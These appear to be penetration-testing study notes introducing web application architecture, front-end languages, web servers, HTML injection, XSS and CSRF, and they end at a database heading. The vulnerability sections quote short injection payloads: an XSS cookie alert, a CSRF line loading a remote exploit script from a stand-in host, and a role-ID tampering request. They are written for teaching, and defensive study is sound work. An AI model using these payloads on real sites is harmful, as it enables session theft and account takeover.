* ## Intro
	* [Web applications](https://en.wikipedia.org/wiki/Web_application) are interactive applications that run on web browsers. Web applications usually adopt a [client-server architecture](https://cio-wiki.org/wiki/Client_Server_Architecture) to run and handle interactions.
	* They typically have front end components (i.e., the website interface, or "what the user sees") that run on the client-side (browser) and other back end components (web application source code) that run on the server-side (back end server/databases).
	* Some examples of typical web applications include online email services like `Gmail`, online retailers like `Amazon`, and online word processors like `Google Docs`.
	* **Web Apps vs. Websites**
		* ![[Pasted image 20231219113153.png]]
	* **Web Apps vs. Native Operating System Applications**
		* Unlike native operating system (native OS) applications, web applications are platform-independent and can run in a browser on any operating system.
	* **Web App Distribution**
		* There are many open-source web applications used by organizations worldwide that can be customized to meet each organization's needs. Some common open source web applications include:
			- [WordPress](https://wordpress.com/)
			- [OpenCart](https://www.opencart.com/)
			- [Joomla](https://www.joomla.org/)
		- There are also proprietary 'closed source' web applications, which are usually developed by a certain organization and then sold to another organization or used by organizations through a subscription plan model. Some common closed source web applications include:
			- [Wix](https://www.wix.com/)
			- [Shopify](https://www.shopify.com/)
			- [DotNetNuke](https://www.dnnsoftware.com/)
	- **Security Risks of Web Apps**
		- Web application penetration testing is an increasingly critical skill to learn.
		- One of the most current and widely used methods for testing web applications is the [OWASP Web Security Testing Guide](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing).
		- One of the most common procedures is to start by reviewing a web application's front end components, such as `HTML`, `CSS` and `JavaScript` (also known as the front end trinity), and attempt to find vulnerabilities such as [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) and [Cross-Site Scripting (XSS)](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)).
		- Once all front end components are thoroughly tested, we would typically review the web application's core functionality and the interaction between the browser and the webserver to enumerate the technologies the webserver uses and look for exploitable flaws. We typically assess web applications from both an unauthenticated and authenticated perspective (if the application has login functionality) to maximize coverage and review every possible attack scenario.
	- **Attacking Web Apps**
		- Nowadays, it is not very common to find an externally facing host directly exploitable via a known public exploit (such as a vulnerable service or Windows remote code execution (RCE) vulnerability), though it does happen. 
		- It is not uncommon to find flaws that can lead directly to code execution, such as a file upload form that allows for the upload of malicious code or a file inclusion vulnerability that can be leveraged to obtain remote code execution. A well-known vulnerability that is still quite prevalent in various types of web applications is SQL injection. This type of vulnerability arises from the unsafe handling of user-supplied input. It can result in access to sensitive data, reading/writing files on the database server, and even remote code execution.
		- We often find SQL injection vulnerabilities on web applications that use Active Directory for authentication. While we can usually not leverage this to extract passwords (since Active Directory administers them), we can often pull most or all Active Directory user email addresses, which are often the same as their usernames.
			- This data can then be used to perform a [password spraying](https://us-cert.cisa.gov/ncas/current-activity/2019/08/08/acsc-releases-advisory-password-spraying-attacks) attack against web portals that use Active Directory for authentication such as VPN or Microsoft Outlook Web Access/Microsoft O365. A successful password spray can often result in access to sensitive data such as email or even a foothold directly into the corporate network environment.
		- This example shows the damage that can arise from a single web application vulnerability, especially when "chained" to extract data from one application that can be used to attack other portions of a company's external infrastructure. A well-rounded infosec professional should have a deep understanding of web applications and be as comfortable attacking web applications as performing network penetration testing and Active Directory attacks. A penetration tester with a strong foundation in web applications can often set themselves apart from their peers and find flaws that others may overlook. A few more real-world examples of web application attacks and the impact are as follows:
			- |[SQL injection](https://owasp.org/www-community/attacks/SQL_Injection)|Obtaining Active Directory usernames and performing a password spraying attack against a VPN or email portal.
			- |[File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)|Reading source code to find a hidden page or directory which exposes additional functionality that can be used to gain remote code execution.
			- |[Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)|A web application that allows a user to upload a profile picture that allows any file type to be uploaded (not just images). This can be leveraged to gain full control of the web application server by uploading malicious code.
			- |[Insecure Direct Object Referencing (IDOR)](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)|When combined with a flaw such as broken access control, this can often be used to access another user's files or functionality. An example would be editing your user profile browsing to a page such as /user/701/edit-profile. If we can change the `701` to `702`, we may edit another user's profile!
			- |[Broken Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)|Another example is an application that allows a user to register a new account. If the account registration functionality is designed poorly, a user may perform privilege escalation when registering. Consider the `POST` request when registering a new user, which submits the data `username=bjones&password=Welcome1&email=bjones@inlanefreight.local&roleid=3`. What if we can manipulate the `roleid` parameter and change it to `0` or `1`. We have seen real-world applications where this was the case, and it was possible to quickly register an admin user and access many unintended features of the web application.
- ## Web App Layout
	- No two web apps are identical.
	- Web application layouts consist of many different layers that can be summarized with the following three main categories:
		- |`Web Application Infrastructure`|Describes the structure of required components, such as the database, needed for the web application to function as intended. Since the web application can be set up to run on a separate server, it is essential to know which database server it needs to access.
			- **Client-Server** (front end (client-side) and back end (server-side))
				- ![[Pasted image 20231219115847.png]]
			- **One Server** (riskiest)
				- ![[Pasted image 20231219120522.png]]
			- **Many Servers** - One Database (more secure)
				- ![[Pasted image 20231219120643.png]]
			- **Many Servers** - Many Databases (most secure/redundant)
				- ![[Pasted image 20231219120659.png]]
		- |`Web Application Components`|The components that make up a web application represent all the components that the web application interacts with. These are divided into the following three areas: `UI/UX`, `Client`, and `Server` components.
			1. **Client**
			2. **Server**
				- Webserver
				- Web App Logic
				- Database
			3. **Services** (Microservices)
				- 3rd Party Integrations
				- Web App Integrations
			4. **Functions** (Serverless)
		- |`Web Application Architecture`|Architecture comprises all the relationships between the various web application components.
			- **Presentation Layer** - Consists of UI process components that enable communication with the application and the system. These can be accessed by the client via the web browser and are returned in the form of HTML, JavaScript, and CSS.
			- **App Layer** - This layer ensures that all client requests (web requests) are correctly processed. Various criteria are checked, such as authorization, privileges, and data passed on to the client.
			- **Data Layer** - The data layer works closely with the application layer to determine exactly where the required data is stored and can be accessed.
			- Example:
				- ![[Pasted image 20231219121119.png]]
	- Microservices example for online store:
		- Registration
		- Search
		- Payments
		- Ratings
		- Reviews
	- Another essential and efficient microservice component is that they can be written in different programming languages and still interact. Microservices benefit from easier scaling and faster development of applications, which encourages innovation and speeds upmarket delivery of new features. Some benefits of microservices include:
		- Agility
		- Flexible scaling
		- Easy deployment
		- Reusable code
		- Resilience
	- **Serverless**
		- Cloud providers such as AWS, GCP, Azure, among others, offer serverless architectures.
		- These platforms provide application frameworks to build such web applications without having to worry about the servers themselves.
		- These web applications then run in stateless computing containers (Docker, for example).
			- This type of architecture gives a company the flexibility to build and deploy applications and services without having to manage infrastructure; all server management is done by the cloud provider, which gets rid of the need to provision, scale, and maintain servers needed to run applications and databases.
	- **Architecture Security**
		- In many cases, an individual web application's vulnerability may not necessarily be caused by a programming error but by a design error in its architecture.
			- For example, an individual web application may have all of its core functionality secure implemented. However, due to a lack of proper access control measures in its design, i.e., use of [Role-Based Access Control(RBAC)](https://en.wikipedia.org/wiki/Role-based_access_control), users may be able to access some admin features that are not intended to be directly accessible to them or even access other user's private information without having the privileges to do so. To fix this type of issue, a significant design change would need to be implemented, which would likely be both costly and time-consuming.
			- Another example would be if we cannot find the database after exploiting a vulnerability and gaining control over the back-end server, which may mean that the database is hosted on a separate server. We may only find part of the database data, which may mean there are several databases in use.
		- This is why security must be considered at each phase of web application development, and penetration tests must be carried throughout the web application development lifecycle.
- ## Front End vs. Back End
	- The front end of a web application contains the user's components directly through their web browser (client-side). These components make up the source code of the web page we view when visiting a web application and usually include `HTML`, `CSS`, and `JavaScript`, which is then interpreted in real-time by our browsers.
	- This includes everything that the user sees and interacts with, like the page's main elements such as the title and text [HTML](https://www.w3schools.com/html/html_intro.asp), the design and animation of all elements [CSS](https://www.w3schools.com/css/css_intro.asp), and what function each part of a page performs [JavaScript](https://www.w3schools.com/js/js_intro.asp).
	- ```
		<p><strong>Welcome to Hack The Box Academy</strong><strong></strong></p>
		<p></p>
		<p><em>This is some italic text.</em></p>
		<p></p>
		<p><span style="color: #0000ff;">This is some blue text.</span></p>
		<p></p>
		<p></p>```
	* **Back End**
		* The back end of a web application drives all of the core web application functionalities, all of which is executed at the back end server, which processes everything required for the web application to run correctly. It is the part we may never see or directly interact with, but a website is just a collection of static web pages without a back end.
		* There are four main back end components for web applications:
			* |`Back end Servers`|The hardware and operating system that hosts all other components and are usually run on operating systems like `Linux`, `Windows`, or using `Containers`.
			* |`Web Servers`|Web servers handle HTTP requests and connections. Some examples are `Apache`, `NGINX`, and `IIS`.
			* |`Databases`|Databases (`DBs`) store and retrieve the web application data. Some examples of relational databases are `MySQL`, `MSSQL`, `Oracle`, `PostgreSQL`, while examples of non-relational databases include `NoSQL` and `MongoDB`.
			* |`Development Frameworks`|Development Frameworks are used to develop the core Web Application. Some well-known frameworks include `Laravel` (`PHP`), `ASP.NET` (`C#`), `Spring` (`Java`), `Django` (`Python`), and `Express` (`NodeJS JavaScript`).
		* ![[Pasted image 20231219140546.png]]
		* Some of the main jobs performed by back end components include:
			- Develop the main logic and services of the back end of the web application
			- Develop the main code and functionalities of the web application
			- Develop and maintain the back end database
			- Develop and implement libraries to be used by the web application
			- Implement technical/business needs for the web application
			- Implement the main [APIs](https://en.wikipedia.org/wiki/API) for front end component communications
			- Integrate remote servers and cloud services into the web application
	- **Securing Front/Back End**
		- The `top 20` most common mistakes web developers make that are essential for us as penetration testers are:
			- |`1.`|Permitting Invalid Data to Enter the Database
			- |`2.`|Focusing on the System as a Whole
			- |`3.`|Establishing Personally Developed Security Methods
			- |`4.`|Treating Security to be Your Last Step
			- |`5.`|Developing Plain Text Password Storage
			- |`6.`|Creating Weak Passwords
			- |`7.`|Storing Unencrypted Data in the Database
			- |`8.`|Depending Excessively on the Client Side
			- |`9.`|Being Too Optimistic
			- |`10.`|Permitting Variables via the URL Path Name
			- |`11.`|Trusting third-party code
			- |`12.`|Hard-coding backdoor accounts
			- |`13.`|Unverified SQL injections
			- |`14.`|Remote file inclusions
			- |`15.`|Insecure data handling
			- |`16.`|Failing to encrypt data properly
			- |`17.`|Not using a secure cryptographic system
			- |`18.`|Ignoring layer 8
			- |`19.`|Review user actions
			- |`20.`|Web Application Firewall misconfigurations
	- These mistakes lead to the [OWASP Top 10](https://owasp.org/www-project-top-ten/) vulnerabilities for web applications, which we will discuss in other modules:
		- |`1.`|Broken Access Control
		- |`2.`|Cryptographic Failures
		- |`3.`|Injection
		- |`4.`|Insecure Design
		- |`5.`|Security Misconfiguration
		- |`6.`|Vulnerable and Outdated Components
		- |`7.`|Identification and Authentication Failures
		- |`8.`|Software and Data Integrity Failures
		- |`9.`|Security Logging and Monitoring Failures
		- |`10.`|Server-Side Request Forgery (SSRF)
* ## HTML
	* The first and most dominant component of the front end of web applications is [HTML (HyperText Markup Language)](https://en.wikipedia.org/wiki/HTML). HTML is at the very core of any web page we see on the internet. It contains each page's basic elements, including titles, forms, images, and many other elements. The web browser, in turn, interprets these elements and displays them to the end-user.![[Pasted image 20231219141826.png]]
	* **URL Encoding**
		* An important concept to learn in HTML is [URL Encoding](https://en.wikipedia.org/wiki/Percent-encoding), or percent-encoding. For a browser to properly display a page's contents, it has to know the charset in use. In URLs, for example, browsers can only use [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding, which only allows alphanumerical characters and certain special characters. Therefore, all other characters outside of the ASCII character-set have to be encoded within a URL. URL encoding replaces unsafe ASCII characters with a `%` symbol followed by two hexadecimal digits.
		* For example, the single-quote character '`'`' is encoded to '`%27`', which can be understood by browsers as a single-quote. URLs cannot have spaces in them and will replace a space with either a `+` (plus sign) or `%20`. Some common character encodings are:
			* ![[Pasted image 20231219141924.png]]
		* A full character encoding table can be seen [here](https://www.w3schools.com/tags/ref_urlencode.ASP).
		* Many online tools can be used to perform URL encoding/decoding. Furthermore, the popular web proxy [Burp Suite](https://portswigger.net/burp) has a decoder/encoder which can be used to convert between various types of encodings. [online tool](https://www.url-encode-decode.com/).
	* **Usage**
		* The `<head>` element usually contains elements that are not directly printed on the page, like the page title, while all main page elements are located under `<body>`. Other important elements include the `<style>`, which holds the page's CSS code, and the `<script>`, which holds the JS code of the page, as we will see in the next section.
		* Each of these elements is called a [DOM (Document Object Model)](https://en.wikipedia.org/wiki/Document_Object_Model). The [World Wide Web Consortium (W3C)](https://www.w3.org/) defines `DOM` as:
			* `"The W3C Document Object Model (DOM) is a platform and language-neutral interface that allows programs and scripts to dynamically access and update the content, structure, and style of a document."`
		* The DOM standard is separated into 3 parts:
			- `Core DOM` - the standard model for all document types
			- `XML DOM` - the standard model for XML documents
			- `HTML DOM` - the standard model for HTML documents
		* For example, from the above tree view, we can refer to DOMs as `document.head` or `document.h1`, and so on.
		* We can locate HTML elements by their id, their tag name, or by their class name.
		* This is also useful when we want to utilize front-end vulnerabilities (like `XSS`) to manipulate existing elements or create new elements to serve our needs.
* ## Cascading Style Sheets (CSS)
	* [CSS (Cascading Style Sheets)](https://www.w3.org/Style/CSS/Overview.en.html) is the stylesheet language used alongside HTML to format and set the style of HTML elements. Like HTML, there are several versions of CSS, and each subsequent version introduces a new set of capabilities that can be used for formatting HTML elements. Browsers are updated alongside it to support these new features.
		* ```
		body {
		  background-color: black;
		}
		
		h1 {
		  color: white;
		  text-align: center;
		}
		
		p {
		  font-family: helvetica;
		  font-size: 10px;
		}```
	* **Syntax**
		* CSS defines the style of each HTML element or class between curly brackets `{}`, within which the properties are defined with their values (i.e. `element { property : value; }`).
		* Each HTML element has many properties that can be set through CSS, such as `height`, `position`, `border`, `margin`, `padding`, `color`, `text-align`, `font-size`, and hundreds of other properties. All of these can be combined and used to design visually appealing web pages.
		* CSS can be used for advanced animations for a wide variety of uses, from moving items all the way to advanced 3D animations. Many CSS properties are available for animations, like `@keyframes`, `animation`, `animation-duration`, `animation-direction`, and many others. You can read about and try out many of these animation properties [here](https://www.w3schools.com/css/css3_animations.asp).
	* **Usage**
		* CSS is often used alongside JavaScript to make quick calculations, dynamically adjust the style properties of certain HTML elements, or achieve advanced animations based on keystrokes or the mouse cursor location.
		* Furthermore, CSS can be used alongside other languages to implement their styles, like `XML` or within `SVG` items, and can also be used in modern mobile development platforms to design entire mobile application User Interfaces (UI).
	* **Frameworks**
		* Many may consider CSS to be difficult to develop. In contrast, others may argue that it is inefficient to manually set the style and design of all HTML elements in each web page.
		* This is why many CSS frameworks have been introduced, which contain a collection of CSS style-sheets and designs, to make it much faster and easier to create beautiful HTML elements.
		* Furthermore, these frameworks are optimized for web application usage. They are designed to be used with JavaScript and for wide use within a web application and contain elements usually required within modern web applications. Some of the most common CSS frameworks are:
			- [Bootstrap](https://www.w3schools.com/bootstrap4/)
			- [SASS](https://sass-lang.com/)
			- [Foundation](https://en.wikipedia.org/wiki/Foundation_(framework))
			- [Bulma](https://bulma.io/)
			- [Pure](https://purecss.io/)
- ## JavaScript
	- [JavaScript](https://en.wikipedia.org/wiki/JavaScript) is one of the most used languages in the world. It is mostly used for web development and mobile development.
	- `JavaScript` is usually used on the front end of an application to be executed within a browser. Still, there are implementations of back end JavaScript used to develop entire web applications, like [NodeJS](https://nodejs.org/en/about/).
	- While `HTML` and `CSS` are mainly in charge of how a web page looks, `JavaScript` is usually used to control any functionality that the front end web page requires. Without `JavaScript`, a web page would be mostly static and would not have much functionality or interactive elements.
		- Within the page source code, `JavaScript` code is loaded with the `<script>` tag, as follows:
			- ```
			<script type="text/javascript">
			..JavaScript code..
			</script>```
		* A web page can also load remote `JavaScript` code with `src` and the script's link, as follows:
			* `<script src="./script.js"></script>`
		* An example of basic use of `JavaScript` within a web page is the following:
			* `document.getElementById("button1").innerHTML = "Changed Text!";`
	* As with HTML, there are many sites available online to experiment with `JavaScript`. One example is [JSFiddle](https://jsfiddle.net/) which can be used to test `JavaScript`, `CSS`, and `HTML` and save code snippets. `JavaScript` is an advanced language, and its syntax is not as simple as `HTML` or `CSS`.
	* **Usage**
		* Most common web applications heavily rely on `JavaScript` to drive all needed functionality on the web page, like updating the web page view in real-time, dynamically updating content in real-time, accepting and processing user input, and many other potential functionalities.
		* `JavaScript` is also used to automate complex processes and perform HTTP requests to interact with the back end components and send and retrieve data, through technologies like [Ajax](https://en.wikipedia.org/wiki/Ajax_(programming)).
		* In addition to automation, `JavaScript` is also often used alongside `CSS`, as previously mentioned, to drive advanced animations that would not be possible with `CSS` alone. Whenever we visit an interactive and dynamic web page that uses many advanced and visually appealing animations, we are seeing the result of active `JavaScript` code running on our browser.
		* All modern web browsers are equipped with `JavaScript` engines that can execute `JavaScript` code on the client-side without relying on the back end webserver to update the page. This makes using `JavaScript` a very fast way to achieve a large number of processes quickly.
	* **Frameworks**
		* As web applications become more advanced, it may be inefficient to use pure `JavaScript` to develop an entire web application from scratch. This is why a host of `JavaScript` frameworks have been introduced to improve the experience of web application development.
		* These platforms introduce libraries that make it very simple to re-create advanced functionalities, like user login and user registration, and they introduce new technologies based on existing ones, like the use of dynamically changing `HTML` code, instead of using static `HTML` code.
		* These platforms either use `JavaScript` as their programming language or use an implementation of `JavaScript` that compiles its code into `JavaScript` code.
		* Some of the most common front end `JavaScript` frameworks are:
			- [Angular](https://www.w3schools.com/angular/angular_intro.asp)
			- [React](https://www.w3schools.com/react/react_intro.asp)
			- [Vue](https://www.w3schools.com/whatis/whatis_vue.asp)
			- [jQuery](https://www.w3schools.com/jquery/)
		- A listing and comparison of common JavaScript frameworks can be found [here](https://en.wikipedia.org/wiki/Comparison_of_JavaScript_frameworks).
- ## Sensitive Data Exposure
	- [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) refers to the availability of sensitive data in clear-text to the end-user. This is usually found in the `source code` of the web page or page source on the front end of web applications.
		- This is the HTML source code of the application, not to be confused with the back end code that is typically only accessible on the server itself. We can view any website's page source in our browser by right-clicking anywhere on the page and selecting `View Page Source` from the pop-up menu.
		- Sometimes a developer may disable right-clicking on a web application, but this does not prevent us from viewing the page source as we can merely type `ctrl + u` or view the page source through a web proxy such as `Burp Suite`. 
	- Sometimes we may find login `credentials`, `hashes`, or other sensitive data hidden in the comments of a web page's source code or within external `JavaScript` code being imported.
	- Other sensitive information may include exposed links or directories or even exposed user information, all of which can potentially be leveraged to further our access within the web application or even the web application's supporting infrastructure (webserver, database server, etc.).
	- For this reason, one of the first things we should do when assessing a web application is to review its page source code to see if we can identify any 'low-hanging fruit', such as exposed credentials or hidden links.
	- **Prevention**
		- Ideally, the front end source code should only contain the code necessary to run all of the web applications functions, without any extra code or comments that are not necessary for the web application to function properly. It is always important to **review** the code that will be visible to end-users through the page source or run it through tools to check for exposed information.
		- It is also important to **classify data types** within the source code and apply controls on what can or cannot be exposed on the client-side. Developers should also **review client-side code** to ensure that no unnecessary comments or hidden links are left behind. Furthermore, front end developers may want to use `JavaScript` code packing or obfuscation to reduce the chances of exposing sensitive data through `JavaScript code`. These techniques may prevent automated tools from locating these types of data.
- ## HTML Injection
	- Another major aspect of front end security is validating and sanitizing accepted user input. In many cases, user input validation and sanitization is carried out on the back end. However, some user input would never make it to the back end in some cases and is completely processed and rendered on the front end. Therefore, it is critical to validate and sanitize user input on both the front end and the back end.
	- [HTML injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection) occurs when unfiltered user input is displayed on the page. This can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through `JavaScript` on the front end.
	- When a user has complete control of how their input will be displayed, they can submit `HTML` code, and the browser may display it as part of the page. This may include a malicious `HTML` code, like an external login form, which can be used to trick users into logging in while actually sending their login credentials to a malicious server to be collected for other attacks.
	- Another example of `HTML Injection` is web page defacing. This consists of injecting new `HTML` code to change the web page's appearance, inserting malicious ads, or even completely changing the page. This type of attack can result in severe reputational damage to the company hosting the web application.
		- `<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>`
		- Once we input it, we see that the web page's background image changes instantly.
- ## Cross-Site Scripting (XSS)
	- `HTML Injection` vulnerabilities can often be utilized to also perform [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) attacks by injecting `JavaScript` code to be executed on the client-side. Once we can execute code on the victim's machine, we can potentially gain access to the victim's account or even their machine.
	- `XSS` is very similar to `HTML Injection` in practice. However, `XSS` involves the injection of `JavaScript` code to perform more advanced attacks on the client-side, instead of merely injecting HTML code. There are three main types of `XSS`:
		- `Reflected XSS` - Occurs when user input is displayed on the page after processing (e.g., search result or error message).
		- `Stored XSS` - Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).
		- `DOM XSS` - Occurs when user input is directly shown in the browser and is written to an `HTML` DOM object (e.g., vulnerable username or page title).
	- `#"><img src=/ onerror=alert(document.cookie)>`
	- Once we input our payload and hit `ok`, we see that an alert window pops up with the cookie value in it.
- ## Cross-Site Request Forgery (CSRF)
	- The third type of front end vulnerability that is caused by unfiltered user input is [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf).
	- `CSRF` attacks may utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.
	- A common `CSRF` attack to gain higher privileged access to a web application is to craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker.
		- Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the `JavaScript` `CSRF` payload), the `JavaScript` code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.
	- `CSRF` can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using `JavaScript` code that would return the session cookie, we would load a remote `.js` (`JavaScript`) file, as follows:
		- `"><script src=//www.example.com/exploit.js></script>`
		- The `exploit.js` file would contain the malicious `JavaScript` code that changes the user's password. Developing the `exploit.js` in this case requires knowledge of this web application's password changing procedure and `APIs`. The attacker would need to create `JavaScript` code that would replicate the desired functionality and automatically carry it out (i.e., `JavaScript` code that changes our password for this specific web application).
	- **Prevention**
		- Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client-side without communicating with the back end. Two main controls must be applied when accepting user input:
			- `Sanitization` - Removing special characters and non-standard characters from user input before displaying it or storing it.
			- `Validation` - Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)
		- It is also important to sanitize displayed output and clear any special/non-standard characters. In case an attacker manages to bypass front end and back end sanitization and validation filters, it will still not cause any harm on the front end.
		- Once we sanitize and/or validate user input and displayed output, we should be able to prevent attacks like `HTML Injection`, `XSS`, or `CSRF`.
		- Another solution would be to implement a [web application firewall (WAF)](https://en.wikipedia.org/wiki/Web_application_firewall), which should help to prevent injection attempts automatically. 
			- However, WAF solutions can potentially be bypassed, so developers should follow coding best practices and not merely rely on an appliance to detect/block attacks.
		* As for `CSRF`, many modern browsers have built-in anti-CSRF measures, which prevent automatically executing `JavaScript` code.
		* Furthermore, many modern web applications have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e., `anti-CSRF` token, or `http-only`/`X-XSS-Protection`).
		* Certain other measures can be taken from a functional level, like requiring the user to input their password before changing it.
		* Many of these security measures can be bypassed, and therefore these types of vulnerabilities can still pose a major threat to the users of a web application. This is why these precautions should only be relied upon as a secondary measure, and developers should always ensure that their code is not vulnerable to any of these attacks.
		* This [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) from OWASP discusses the attack and prevention measures in greater detail.
* ## Back End Servers
	* A back-end server is the hardware and operating system on the back end that hosts all of the applications necessary to run the web application. It is the real system running all of the processes and carrying out all of the tasks that make up the entire web application. The back end server would fit in the [Data access layer](https://en.wikipedia.org/wiki/Data_access_layer).
	* The back end server contains the other 3 back end components:
		* Web Server
		* Database
		* Development Framework
	* ![[Pasted image 20231219140546 1.png]]
	* Other software components on the back end server may include [hypervisors](https://en.wikipedia.org/wiki/Hypervisor), containers, and WAFs.
	* There are many popular combinations of "stacks" for back-end servers, which contain a specific set of back end components. Some common examples include:
		* |[LAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle))|`Linux`, `Apache`, `MySQL`, and `PHP`.
		* |[WAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)#WAMP)|`Windows`, `Apache`, `MySQL`, and `PHP`.
		* |[WINS](https://en.wikipedia.org/wiki/Solution_stack)|`Windows`, `IIS`, `.NET`, and `SQL Server`.
		* |[MAMP](https://en.wikipedia.org/wiki/MAMP)|`macOS`, `Apache`, `MySQL`, and `PHP`.
		* |[XAMPP](https://en.wikipedia.org/wiki/XAMPP)|Cross-Platform, `Apache`, `MySQL`, and `PHP/PERL`.
	* We can find a comprehensive list of Web Solution Stacks in this [article](https://en.wikipedia.org/wiki/Solution_stack).
	* **Hardware**
		* The back end server contains all of the necessary hardware. The power and performance capabilities of this hardware determine how stable and responsive the web application will be.
		* As previously discussed in the `Architecture` section, many architectures, especially for huge web applications, are designed to distribute their load over many back end servers that collectively work together to perform the same tasks and deliver the web application to the end-user.
		* Web applications do not have to run directly on a single back end server but may utilize data centers and cloud hosting services that provide virtual hosts for the web application.
* ## Web Servers
	* A [web server](https://en.wikipedia.org/wiki/Web_server) is an application that runs on the back end server, which handles all of the HTTP traffic from the client-side browser, routes it to the requested pages, and finally responds to the client-side browser.
	* Web servers usually run on TCP [ports](https://en.wikipedia.org/wiki/Port_(computer_networking)) `80` or `443`, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses.
	* **Workflow**
		* A typical web server accepts HTTP requests from the client-side, and responds with different HTTP responses and codes, like a code `200 OK` response for a successful request, a code `404 NOT FOUND` when requesting pages that do not exist, code `403 FORBIDDEN` for requesting access to restricted pages, and so on.
		* ![[Pasted image 20231220111753.png]]
		* ![[Pasted image 20231220111817.png]]
		* Web servers also accept various types of user input within HTTP requests, including text, [JSON](https://www.w3schools.com/js/js_json_intro.asp), and even binary data (i.e., for file uploads).
		* Once a web server receives a web request, it is then responsible for routing it to its destination, run any processes needed for that request, and return the response to the user on the client-side. The pages and files that the webserver processes and routes traffic to are the web application core files.
		* The following shows an example of requesting a page in a Linux terminal using the [cURL](https://en.wikipedia.org/wiki/CURL) utility, and receiving the server response while using the `-I` flag, which displays the headers:
			* `curl -I https://academy.hackthebox.com`
		* Many web server types can be utilized to run web applications. Most of these can handle all types of complex HTTP requests, and they are usually free of charge. We can even develop our own basic web server using languages such as `Python`, `JavaScript`, and `PHP`. However, for each language, there's a popular web application that is optimized for handling large amounts of web traffic, which saves us time in creating our own web server.
	* **Apache**
		* [Apache](https://www.apache.org/) 'or `httpd`' is the most common web server on the internet, hosting more than `40%` of all internet websites. `Apache` usually comes pre-installed in most `Linux` distributions and can also be installed on Windows and macOS servers.
		* `Apache` is usually used with `PHP` for web application development, but it also supports other languages like `.Net`, `Python`, `Perl`, and even OS languages like `Bash` through `CGI`. Users can install a wide variety of `Apache` modules to extend its functionality and support more languages. For example, to support serving `PHP` files, users must install `PHP` on the back end server, in addition to installing the `mod_php` module for `Apache`.
		* `Apache` is an open-source project, and community users can access its source code to fix issues and look for vulnerabilities. It is well-maintained and regularly patched against vulnerabilities to keep it safe against exploitation. Furthermore, it is very well documented, making using and configuring different parts of the webserver relatively easy. `Apache` is commonly used by startups and smaller companies, as it is straightforward to develop for. Still, some big companies utilize Apache, including:
			* Apple
			* Adobe
			* Baidu
	* **NGINX**
		* [NGINX](https://www.nginx.com/) is the second most common web server on the internet, hosting roughly `30%` of all internet websites. `NGINX` focuses on serving many concurrent web requests with relatively low memory and CPU load by utilizing an async architecture to do so. This makes `NGINX` a very reliable web server for popular web applications and top businesses worldwide, which is why it is the most popular web server among high traffic websites, with around 60% of the top 100,000 websites using `NGINX`.
		* `NGINX` is also free and open-source, which gives all the same benefits previously mentioned, like security and reliability. Some popular websites that utilize `NGINX` include:
			* Google
			* Facebook
			* Twitter
			* Cisco
			* Intel
			* Netflix
			* HackTheBox
	* **IIS**
		* [IIS (Internet Information Services)](https://en.wikipedia.org/wiki/Internet_Information_Services) is the third most common web server on the internet, hosting around `15%` of all internet web sites. `IIS` is developed and maintained by Microsoft and mainly runs on Microsoft Windows Servers. `IIS` is usually used to host web applications developed for the Microsoft .NET framework, but can also be used to host web applications developed in other languages like `PHP`, or host other types of services like `FTP`. Furthermore, `IIS` is very well optimized for Active Directory integration and includes features like `Windows Auth` for authenticating users using Active Directory, allowing them to automatically sign in to web applications.
		* Though not the most popular web server, many big organizations use `IIS` as their web server. Many of them use Windows Server on their back end or rely heavily on Active Directory within their organization. Some popular websites that utilize IIS include:
			* Microsoft
			* Office365
			* Skype
			* Stack Overflow
			* Dell
	* Aside from these 3 web servers, there are many other commonly used web servers, like [Apache Tomcat](https://tomcat.apache.org/) for `Java` web applications, and [Node.JS](https://nodejs.org/en/) for web applications developed using `JavaScript` on the back end.
* ## Databases
	* Web applications utilize back end [databases](https://en.wikipedia.org/wiki/Database) to store various content and information related to the web application. This can be core web application assets like images and files, web application content like posts and updates, or user data like usernames and passwords. This allows web applications to easily and quickly store and retrieve data and enable dynamic content that is different for each user.
	* There are many different types of databases, each of which fits a certain type of use. Most developers look for certain characteristics in a database, such as `speed` in storing and retrieving data, `size` when storing large amounts of data, `scalability` as the web application grows, and `cost`.
	* **Relational (SQL)**
